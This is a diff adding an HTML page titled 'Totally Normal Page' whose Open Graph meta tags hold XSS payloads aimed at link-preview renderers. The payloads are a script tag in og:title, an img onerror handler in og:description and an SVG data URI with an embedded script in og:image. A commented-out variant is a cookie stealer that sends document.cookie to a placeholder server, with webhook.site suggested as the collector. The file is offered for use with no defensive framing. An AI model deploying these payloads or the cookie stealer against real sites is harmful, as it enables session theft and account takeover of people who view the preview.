@@ -1,0 +1,24 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- OG XSS Payloads — swap in whichever fires -->
+
+  <!-- Vector 1: script tag in og:title -->
+  <meta property="og:title" content="<script>alert(1)</script>">
+
+  <!-- Vector 2: img onerror in og:description -->
+  <meta property="og:description" content="<img src=x onerror=alert(1)>">
+
+  <!-- Vector 3: SVG as og:image (inline data URI) -->
+  <meta property="og:image" content="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)<\/script></svg>">
+
+  <!-- Vector 4: cookie stealer (replace YOUR_SERVER with webhook.site URL) -->
+  <!-- <meta property="og:title" content="<script>fetch('https://YOUR_SERVER/?c='+document.cookie)</script>"> -->
+
+  <title>Totally Normal Page</title>
+</head>
+<body>
+  <p>Nothing to see here.</p>
+</body>
+</html>
